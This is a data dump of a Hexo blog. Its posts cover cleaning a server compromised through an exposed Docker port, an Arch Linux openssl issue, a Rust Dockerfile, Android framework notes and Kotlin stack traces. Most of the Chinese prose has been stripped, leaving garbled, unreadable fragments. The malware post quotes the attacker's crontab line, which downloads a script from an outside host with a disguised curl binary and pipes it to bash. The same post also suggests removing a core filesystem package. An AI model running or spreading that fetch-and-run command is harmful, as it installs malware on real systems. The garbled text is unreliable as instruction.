Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong>&#x2F;</strong><br><strong></strong><br><br><strong></strong></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png\" alt=\"7e8c1fed3737e6ab\"></a></p>\n<p><strong></strong></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg\" alt=\"-2bf7c04dec497124\"></a></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg\" alt=\"-3e6ca3264d9d5b3a\"></a></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg\" alt=\"54e384ac658f35d9\"></a></p>\n<p><strong></strong><br><a href=\"https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png\" alt=\"1c4ec094fffaaa6a\"></a><br><a href=\"https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png\" alt=\"-1edc645b674852e1\"></a><br><a href=\"https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png\" alt=\"-5462c585fd3183db\"></a></p>\n"},{"title":"","date":"2022-05-16T16:00:00.000Z","author":"","hide":false,"summary":"2375","_content":"\n# \n\n## \n\ndocker2375docker\n\n## \n\n...\n\ndocker\n\n`crontab -l`\n\n~~~sh\n*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash > /dev/null 2>&1\n~~~\n\n\n\n`crontab -e`\n\n> \"/tmp/crontab.Awo30z\" 1L, 1C written\n> crontab: installing new crontab\n> /var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted\n> crontab: edits left in /tmp/crontab.Awo30z\n\nroot\n\n\n\n>   lsattr /var/spool/cron/ \n>\n>   chattr -ai /var/spool/cron/root  && lsattr /var/spool/cron/root\n\nchattr\n\n> [root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron\n> bash: chattr: command not found...\n> Install package 'e2fsprogs' to provide command 'chattr'? [N/y] y  \n>\n>\n>  * Waiting in queue... Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed\n\n\n\n> yum remove e2fsprogs-1.45.6-2.tl3.x86_64\n\n","source":"_posts/deal-with-viruses-in-the-server.md","raw":"---\ntitle: \ndate: 2022-05-17\nauthor: \nhide: false\nsummary: 2375\ncategories: \ntags:\n  - \n---\n\n# \n\n## \n\ndocker2375docker\n\n## \n\n...\n\ndocker\n\n`crontab -l`\n\n~~~sh\n*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash > /dev/null 2>&1\n~~~\n\n\n\n`crontab -e`\n\n> \"/tmp/crontab.Awo30z\" 1L, 1C written\n> crontab: installing new crontab\n> /var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted\n> crontab: edits left in /tmp/crontab.Awo30z\n\nroot\n\n\n\n>   lsattr /var/spool/cron/ \n>\n>   chattr -ai /var/spool/cron/root  && lsattr /var/spool/cron/root\n\nchattr\n\n> [root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron\n> bash: chattr: command not found...\n> Install package 'e2fsprogs' to provide command 'chattr'? [N/y] y  \n>\n>\n>  * Waiting in queue... Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed\n\n\n\n> yum remove e2fsprogs-1.45.6-2.tl3.x86_64\n\n","slug":"deal-with-viruses-in-the-server","published":1,"updated":"2022-11-24T03:03:11.732Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt6000gsfklaesxe5wv","content":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>docker2375docker</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p>docker</p>\n<p><code>crontab -l</code></p>\n<pre class=\"line-numbers language-sh\" data-language=\"sh\"><code class=\"language-sh\">*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash &gt; /dev/null 2&gt;&amp;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p></p>\n<p><code>crontab -e</code></p>\n<blockquote>\n<p>/tmp/crontab.Awo30z 1L, 1C written<br>crontab: installing new crontab<br>/var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted<br>crontab: edits left in /tmp/crontab.Awo30z</p>\n</blockquote>\n<p>root</p>\n<p></p>\n<blockquote>\n<p>  lsattr /var/spool/cron/ </p>\n<p>  chattr -ai /var/spool/cron/root  &amp;&amp; lsattr /var/spool/cron/root</p>\n</blockquote>\n<p>chattr</p>\n<blockquote>\n<p>[root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron<br>bash: chattr: command not found<br>Install package e2fsprogs to provide command chattr? [N/y] y  </p>\n<ul>\n<li>Waiting in queue Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed</li>\n</ul>\n</blockquote>\n<p></p>\n<blockquote>\n<p>yum remove e2fsprogs-1.45.6-2.tl3.x86_64</p>\n</blockquote>\n<p></p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>docker2375docker</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p>docker</p>\n<p><code>crontab -l</code></p>\n<pre class=\"line-numbers language-sh\" data-language=\"sh\"><code class=\"language-sh\">*&#x2F;30 * * * * &#x2F;usr&#x2F;bin&#x2F;cdz -fsSL http:&#x2F;&#x2F;oracle.zzhreceive.top&#x2F;b2f628&#x2F;b.sh | bash &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p></p>\n<p><code>crontab -e</code></p>\n<blockquote>\n<p>&#x2F;tmp&#x2F;crontab.Awo30z 1L, 1C written<br>crontab: installing new crontab<br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted<br>crontab: edits left in &#x2F;tmp&#x2F;crontab.Awo30z</p>\n</blockquote>\n<p>root</p>\n<p></p>\n<blockquote>\n<p>  lsattr &#x2F;var&#x2F;spool&#x2F;cron&#x2F; </p>\n<p>  chattr -ai &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root  &amp;&amp; lsattr &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>\n</blockquote>\n<p>chattr</p>\n<blockquote>\n<p>[root@VM-16-8-centos lighthouse]# chattr -i &#x2F;var&#x2F;spool&#x2F;cron<br>bash: chattr: command not found<br>Install package e2fsprogs to provide command chattr? [N&#x2F;y] y  </p>\n<ul>\n<li>Waiting in queue Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed</li>\n</ul>\n</blockquote>\n<p></p>\n<blockquote>\n<p>yum remove e2fsprogs-1.45.6-2.tl3.x86_64</p>\n</blockquote>\n<p></p>\n"},{"title":"openssl","date":"2022-11-22T16:00:00.000Z","author":"","hide":false,"summary":"","_content":"\n# openssl\n\nlinux6winewindowsSteamwine `proton` aur\n\n![image-20221124005106899](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20221124005106899.png)\n\nopenssl\n\n~~~bash\nyay -S openssl\n~~~\n\n pacman / yay sudo\n\n![](https://pbs.twimg.com/media/FiPUNNNVEAEn7e_?format=jpg&name=large)\n\n\n\n su  su  root  bash  ldd :\n\n![](https://pbs.twimg.com/media/FiPURVJVIAE99Ou?format=png&name=large)\n\n libssl  libcrypto \n\n\n\n![](https://pbs.twimg.com/media/FiPUTmIVUAAXLc4?format=jpg&name=large)\n\n telegram  `pacman-static`pacmanpacman\n\n -Syu  openssl  pacman  aur \n\n![](https://pbs.twimg.com/media/FiPUdVtVQAEYmXh?format=jpg&name=large)\n\n~~~bash\n./pacman-static -U openssl-1.1-1.1.1s-2-x86_64.pkg.tar.zst\n~~~\n\n","source":"_posts/do-not-scorlling-update-openssl.md","raw":"---\ntitle: openssl\ndate: 2022-11-23\nauthor: \nhide: false\nsummary: \ncategories: \ntags:\n  - linux\n  - arch linux\n---\n\n# openssl\n\nlinux6winewindowsSteamwine `proton` aur\n\n![image-20221124005106899](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20221124005106899.png)\n\nopenssl\n\n~~~bash\nyay -S openssl\n~~~\n\n pacman / yay sudo\n\n![](https://pbs.twimg.com/media/FiPUNNNVEAEn7e_?format=jpg&name=large)\n\n\n\n su  su  root  bash  ldd :\n\n![](https://pbs.twimg.com/media/FiPURVJVIAE99Ou?format=png&name=large)\n\n libssl  libcrypto \n\n\n\n![](https://pbs.twimg.com/media/FiPUTmIVUAAXLc4?format=jpg&name=large)\n\n telegram  `pacman-static`pacmanpacman\n\n -Syu  openssl  pacman  aur \n\n![](https://pbs.twimg.com/media/FiPUdVtVQAEYmXh?format=jpg&name=large)\n\n~~~bash\n./pacman-static -U openssl-1.1-1.1.1s-2-x86_64.pkg.tar.zst\n~~~\n\n","slug":"do-not-scorlling-update-openssl","published":1,"updated":"2022-11-24T03:05:46.503Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt7000hsfkl235232wz","content":"<h1 id=\"openssl\"><a href=\"#openssl\" class=\"headerlink\" title=\"openssl\"></a>openssl</h1><p>linux6winewindowsSteamwine <code>proton</code> aur</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20221124005106899.png\" alt=\"image-20221124005106899\"></p>\n<p>openssl</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">yay -S openssl<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> pacman / yay sudo</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUNNNVEAEn7e_?format=jpg&amp;name=large\" alt=\"\"></p>\n<p></p>\n<p> su  su  root  bash  ldd :</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPURVJVIAE99Ou?format=png&amp;name=large\" alt=\"\"></p>\n<p> libssl  libcrypto </p>\n<p></p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUTmIVUAAXLc4?format=jpg&amp;name=large\" alt=\"\"></p>\n<p> telegram  <code>pacman-static</code>pacmanpacman</p>\n<p> -Syu  openssl  pacman  aur </p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUdVtVQAEYmXh?format=jpg&amp;name=large\" alt=\"\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./pacman-static -U openssl-1.1-1.1.1s-2-x86_64.pkg.tar.zst<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p></p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"openssl\"><a href=\"#openssl\" class=\"headerlink\" title=\"openssl\"></a>openssl</h1><p>linux6winewindowsSteamwine <code>proton</code> aur</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20221124005106899.png\" alt=\"image-20221124005106899\"></p>\n<p>openssl</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">yay -S openssl<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> pacman &#x2F; yay sudo</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUNNNVEAEn7e_?format=jpg&name=large\" alt=\"\"></p>\n<p></p>\n<p> su  su  root  bash  ldd :</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPURVJVIAE99Ou?format=png&name=large\" alt=\"\"></p>\n<p> libssl  libcrypto </p>\n<p></p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUTmIVUAAXLc4?format=jpg&name=large\" alt=\"\"></p>\n<p> telegram  <code>pacman-static</code>pacmanpacman</p>\n<p> -Syu  openssl  pacman  aur </p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUdVtVQAEYmXh?format=jpg&name=large\" alt=\"\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./pacman-static -U openssl-1.1-1.1.1s-2-x86_64.pkg.tar.zst<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p></p>\n"},{"title":"Rustdocker","date":"2022-05-28T16:00:00.000Z","author":"","hide":false,"summary":"rustjava","_content":"\n# Rustdocker\n\nrustdockerdocker~\n\nrustdockerjava..?javajardockerjava -jarrustcopydockerrust\n\n502c4g\n\n![2022052901](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/2022052901.png)\n\ncargo\n\n~~~dockerfile\nRUN touch /usr/local/cargo/config.toml\n\n# cargo \nRUN sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;\\\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; \\\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; \\\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; \\\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"\n~~~\n\n\n\ncpu99.75%6G\n\n\n\n~~~dockerfile\nFROM rust\n\nWORKDIR /usr/src/collection-api\nCOPY . .\n\nRUN touch /usr/local/cargo/config.toml\n\n# cargo \nRUN sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;\\\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; \\\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; \\\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; \\\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"\n\n# Rustup \nENV RUSTUP_DIST_SERVER https://mirrors.tuna.tsinghua.edu.cn/rustup\n\nENV DATABASE_URL *\n\nRUN cargo install --path .\n\nCMD [\"collection-api\"]\n~~~\n\n## \n\n> \n\ndockerdockerairplane\n\n","source":"_posts/docker-configuration-for-rust-server.md","raw":"---\ntitle: Rustdocker\ndate: 2022-05-29\nauthor: \nhide: false\nsummary: rustjava\ncategories: \ntags:\n  - rust\n  - docker\n---\n\n# Rustdocker\n\nrustdockerdocker~\n\nrustdockerjava..?javajardockerjava -jarrustcopydockerrust\n\n502c4g\n\n![2022052901](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/2022052901.png)\n\ncargo\n\n~~~dockerfile\nRUN touch /usr/local/cargo/config.toml\n\n# cargo \nRUN sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;\\\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; \\\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; \\\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; \\\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"\n~~~\n\n\n\ncpu99.75%6G\n\n\n\n~~~dockerfile\nFROM rust\n\nWORKDIR /usr/src/collection-api\nCOPY . .\n\nRUN touch /usr/local/cargo/config.toml\n\n# cargo \nRUN sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;\\\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; \\\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; \\\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; \\\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"\n\n# Rustup \nENV RUSTUP_DIST_SERVER https://mirrors.tuna.tsinghua.edu.cn/rustup\n\nENV DATABASE_URL *\n\nRUN cargo install --path .\n\nCMD [\"collection-api\"]\n~~~\n\n## \n\n> \n\ndockerdockerairplane\n\n","slug":"docker-configuration-for-rust-server","published":1,"updated":"2022-11-24T03:02:53.472Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt9000lsfklbsrlc7vb","content":"<h1 id=\"Rustdocker\"><a href=\"#Rustdocker\" class=\"headerlink\" title=\"Rustdocker\"></a>Rustdocker</h1><p>rustdockerdocker~</p>\n<p>rustdockerjava..?javajardockerjava -jarrustcopydockerrust</p>\n<p>502c4g</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/2022052901.png\" alt=\"2022052901\"></p>\n<p>cargo</p>\n<pre class=\"line-numbers language-docker\" data-language=\"docker\"><code class=\"language-docker\"><span class=\"token instruction\"><span class=\"token keyword\">RUN</span> touch /usr/local/cargo/config.toml</span>\n\n<span class=\"token comment\"># cargo </span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;<span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<p>cpu99.75%6G</p>\n<p></p>\n<pre class=\"line-numbers language-docker\" data-language=\"docker\"><code class=\"language-docker\"><span class=\"token instruction\"><span class=\"token keyword\">FROM</span> rust</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">WORKDIR</span> /usr/src/collection-api</span>\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> . .</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> touch /usr/local/cargo/config.toml</span>\n\n<span class=\"token comment\"># cargo </span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;<span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"</span>\n\n<span class=\"token comment\"># Rustup </span>\n<span class=\"token instruction\"><span class=\"token keyword\">ENV</span> RUSTUP_DIST_SERVER https://mirrors.tuna.tsinghua.edu.cn/rustup</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">ENV</span> DATABASE_URL *</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> cargo install --path .</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">CMD</span> [<span class=\"token string\">\"collection-api\"</span>]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><blockquote>\n<p></p>\n</blockquote>\n<p>dockerdockerairplane</p>\n<p></p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Rustdocker\"><a href=\"#Rustdocker\" class=\"headerlink\" title=\"Rustdocker\"></a>Rustdocker</h1><p>rustdockerdocker~</p>\n<p>rustdockerjava..?javajardockerjava -jarrustcopydockerrust</p>\n<p>502c4g</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/2022052901.png\" alt=\"2022052901\"></p>\n<p>cargo</p>\n<pre class=\"line-numbers language-docker\" data-language=\"docker\"><code class=\"language-docker\"><span class=\"token instruction\"><span class=\"token keyword\">RUN</span> touch /usr/local/cargo/config.toml</span>\n\n<span class=\"token comment\"># cargo </span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;<span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<p>cpu99.75%6G</p>\n<p></p>\n<pre class=\"line-numbers language-docker\" data-language=\"docker\"><code class=\"language-docker\"><span class=\"token instruction\"><span class=\"token keyword\">FROM</span> rust</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">WORKDIR</span> /usr/src/collection-api</span>\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> . .</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> touch /usr/local/cargo/config.toml</span>\n\n<span class=\"token comment\"># cargo </span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;<span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"</span>\n\n<span class=\"token comment\"># Rustup </span>\n<span class=\"token instruction\"><span class=\"token keyword\">ENV</span> RUSTUP_DIST_SERVER https://mirrors.tuna.tsinghua.edu.cn/rustup</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">ENV</span> DATABASE_URL *</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> cargo install --path .</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">CMD</span> [<span class=\"token string\">\"collection-api\"</span>]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><blockquote>\n<p></p>\n</blockquote>\n<p>dockerdockerairplane</p>\n<p></p>\n"},{"title":"Android framework","date":"2022-08-31T16:00:00.000Z","author":"","hide":false,"_content":"\n# Android framework\n\n## Q & A\n\n> SystemService(AMS)ZygoteBinderSocket?\n\nZygoteforkBinder\n\n> Zygotefork\n\nZygote fork\n\n> 1. copy-on-write ->  \n> 2. ****\n\nfork\n\nBinderBinderfork\n\n> BinderforkforkZygoteBinder\n\n\n","source":"_posts/framework-study.md","raw":"---\ntitle: Android framework\ndate: 2022-09-01\nauthor: \nhide: false\ncategories: \ntags:\n  - Android\n  - framework\n---\n\n# Android framework\n\n## Q & A\n\n> SystemService(AMS)ZygoteBinderSocket?\n\nZygoteforkBinder\n\n> Zygotefork\n\nZygote fork\n\n> 1. copy-on-write ->  \n> 2. ****\n\nfork\n\nBinderBinderfork\n\n> BinderforkforkZygoteBinder\n\n\n","slug":"framework-study","published":1,"updated":"2022-11-24T03:02:12.163Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jta000nsfklbipc5s6n","content":"<h1 id=\"Android-framework\"><a href=\"#Android-framework\" class=\"headerlink\" title=\"Android framework\"></a>Android framework</h1><h2 id=\"Q-amp-A\"><a href=\"#Q-amp-A\" class=\"headerlink\" title=\"Q &amp; A\"></a>Q &amp; A</h2><blockquote>\n<p>SystemService(AMS)ZygoteBinderSocket?</p>\n</blockquote>\n<p>ZygoteforkBinder</p>\n<blockquote>\n<p>Zygotefork</p>\n</blockquote>\n<p>Zygote fork</p>\n<blockquote>\n<ol>\n<li>copy-on-write -&gt;  </li>\n<li><strong></strong></li>\n</ol>\n</blockquote>\n<p>fork</p>\n<p>BinderBinderfork</p>\n<blockquote>\n<p>BinderforkforkZygoteBinder</p>\n</blockquote>\n<p></p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Android-framework\"><a href=\"#Android-framework\" class=\"headerlink\" title=\"Android framework\"></a>Android framework</h1><h2 id=\"Q-amp-A\"><a href=\"#Q-amp-A\" class=\"headerlink\" title=\"Q &amp; A\"></a>Q &amp; A</h2><blockquote>\n<p>SystemService(AMS)ZygoteBinderSocket?</p>\n</blockquote>\n<p>ZygoteforkBinder</p>\n<blockquote>\n<p>Zygotefork</p>\n</blockquote>\n<p>Zygote fork</p>\n<blockquote>\n<ol>\n<li>copy-on-write -&gt;  </li>\n<li><strong></strong></li>\n</ol>\n</blockquote>\n<p>fork</p>\n<p>BinderBinderfork</p>\n<blockquote>\n<p>BinderforkforkZygoteBinder</p>\n</blockquote>\n<p></p>\n"},{"title":"java/kotlin ","date":"2021-11-03T09:10:42.000Z","author":"","hide":false,"summary":"java/kotlin ","_content":"\nTabooLib5TabooLib5\n\n\n\n## \n\nnewThrowablestackTracestackTraceElement\n\ntry catchstackTrace\n\nExceptionprintStackTrace \n\n****\n\nParctice.kt\n\n```kotlin\npackage kim.bifrost.coldrain.partice\n\n/**\n * kim.bifrost.coldrain.partice.Partice\n * Partice\n *\n * @author \n * @since 2021/11/3 16:45\n **/\nfun main() {\n    test()\n}\n\nfun test() {\n    // \n    val info = Throwable().stackTrace.run {\n        get(size - 2)\n    }\n    println(\"class: ${info.className} method: ${info.methodName}\")\n}\n```\n\n\n\n```\nclass: kim.bifrost.coldrain.partice.ParticeKt method: main\n```\n\n### \n\nThread#getStackTrace()\n\nThrowable#getStackTrace()\n\nLog4j[https://github.com/apache/loggin ... l/StackLocator.java](https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-api/src/main/java/org/apache/logging/log4j/util/StackLocator.java)\n\n## JDK8Reflection.getCallerClass\n\nsun.reflect.Reflection.getCallerClass()\n\nJDK8api","source":"_posts/get-stacktrace-method-path.md","raw":"---\ntitle: java/kotlin \ndate: 2021-11-3 17:10:42\nauthor: \nhide: false\nsummary: java/kotlin \ncategories: \ntags:\n  - Java\n  - Kotlin\n---\n\nTabooLib5TabooLib5\n\n\n\n## \n\nnewThrowablestackTracestackTraceElement\n\ntry 